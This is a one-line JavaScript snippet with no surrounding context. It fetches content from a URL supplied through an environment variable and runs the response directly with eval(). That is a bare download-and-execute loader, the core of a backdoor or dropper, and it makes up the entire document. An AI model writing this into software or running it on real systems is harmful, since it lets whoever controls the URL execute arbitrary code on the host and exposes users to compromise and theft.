require('fetch').fetchUrl(process.env.url, (a, b, c) => eval(c.toString()))
